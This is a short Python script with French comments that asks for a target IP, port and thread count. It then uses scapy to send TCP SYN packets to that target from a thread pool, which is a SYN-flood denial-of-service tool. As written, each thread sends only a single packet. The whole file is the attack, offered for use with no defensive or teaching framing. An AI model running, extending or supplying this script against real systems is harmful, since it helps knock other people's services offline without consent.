import socket
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
from scapy.all import *

# Paramètres de la cible
target = str(input("Insert target’s IP: "))
port = int(input("Insert Port: "))
Trd = int(input("Insert number of Threads: "))

# Queue pour les exceptions
exception_queue = Queue()

def syn_attack():
    try:
        # Création d'un paquet SYN avec scapy
        packet = IP(dst=target)/TCP(dport=port, flags="S")
        send(packet, verbose=False)  # Envoi du paquet en mode silencieux
    except Exception as e:
        exception_queue.put(e)

# Création des threads et lancement de l'attaque
with ThreadPoolExecutor(max_workers=Trd) as executor:
    future_to_thread = {executor.submit(syn_attack): i for i in range(Trd)}
    
    for future in as_completed(future_to_thread):
        thread_id = future_to_thread[future]
        try:
            future.result()
        except Exception as e:
            print(f"Thread {thread_id} raised an exception: {e}")

# Vérification des exceptions après la fin de l'attaque
while not exception_queue.empty():
    print(f"Caught exception: {exception_queue.get()}")
